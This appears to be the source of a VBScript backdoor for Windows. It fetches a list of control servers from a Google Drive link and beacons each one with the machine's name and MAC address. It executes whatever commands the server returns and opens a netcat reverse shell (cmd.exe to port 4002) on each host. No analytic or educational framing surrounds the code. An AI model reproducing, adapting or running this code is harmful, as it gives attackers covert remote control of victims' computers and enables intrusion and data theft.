set xmlhttp = createobject ("Msxml2.ServerXMLHTTP")
dim url,mac
  'url="https://github.com/pistacchietto/Win-Python-Backdoor/raw/master/"
  url="https://drive.google.com/uc?export=download&id=1nT2hQWW1tOM_yxPK5_nhIm8xBVETGXdF"
'msgbox  url&"site.txt"
'xmlhttp.open "get", url&"site.txt", false
xmlhttp.open "get", url, false
xmlhttp.send
strOutput = xmlhttp.responseText
a=Split(strOutput,",")
Set oShell = CreateObject ("WScript.Shell") 
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

strComputerName = oShell.ExpandEnvironmentStrings( "%COMPUTERNAME%" )
Set objWMIService = GetObject("winmgmts:" _
    & "{impersonationLevel=impersonate}!\\" & strComputerName & "\root\cimv2")

Set colAdapters = objWMIService.ExecQuery _
    ("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
for each nad in colAdapters
    If Not IsNull(Nad.DefaultIPGateway) Then
      if not isnull(Nad.MACAddress) then mac=Nad.MACAddress 'Wscript.Echo Nad.description, Nad.MACAddress 
    end if  
next 
Set colItems = objWMIService.ExecQuery("Select * From Win32_Process where name='nc64.exe'")
'msgbox colitems
dim brun
brun=true
For Each objItem in colItems
    'msgbox objItem.name & " " & objItem.ProcessID & " " & objItem.CommandLine
    'If objItem.name = "Calculator.exe" then objItem.terminate
    brun=false
Next
dim arr
  for each x in a
      'msgbox x
      'nc64.exe -w 10 -e cmd.exe config02.addns.org 4002
      Wscript.Echo "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac
      xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac, false
      xmlhttp.send
      strOutput = xmlhttp.responseText
      arr=Split(strOutput,"||")
      Wscript.Echo strOutput
      if (right(arr(7),1)=1) then
        oShell.run right(arr(8),len(arr(8))-4)
        xmlhttp.open "get", "http://"&x&"/svc/wup.php?pc="&strComputerName&"_"&mac&"&exec=0", false
        xmlhttp.send
      end if
      if brun then
        oShell.run "nc64.exe -d -w 10 -e cmd.exe "&x&" 4002"
        
      end if
      WScript.Sleep 100
      
  next

'dim WMI:  set WMI = GetObject("winmgmts:\\.\root\cimv2")
'dim Nads: set Nads = WMI.ExecQuery("Select * from Win32_NetworkAdapter where physicaladapter=true") 
'dim nad



'strOutput = split(xmlhttp.responseText,"Stable release</a>")(1)
'strOutput = split(strOutput,"<small>")(0)
'strOutput = replace(replace(strOutput,vbcr,""),vblf,"")
'strOutput = split(strOutput,"<p>")(1)

'msgbox "Version: " & strOutput